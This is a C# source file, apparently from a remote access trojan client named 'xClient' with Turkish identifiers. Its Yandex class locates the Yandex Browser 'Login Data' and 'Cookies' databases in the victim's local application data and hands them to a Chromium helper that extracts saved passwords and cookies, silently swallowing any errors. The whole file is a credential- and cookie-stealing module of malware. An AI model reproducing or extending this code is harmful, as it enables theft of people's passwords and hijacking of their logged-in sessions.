using System;
using System.Collections.Generic;
using System.IO;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Kurtarma.Utilities;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Kurtarma.Tarayıcılar
{
    public class Yandex
    {
        public static List<KurtarılanHesaplar> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<KurtarılanHesaplar>();
            }
        }
        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Yandex");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }

    }
}
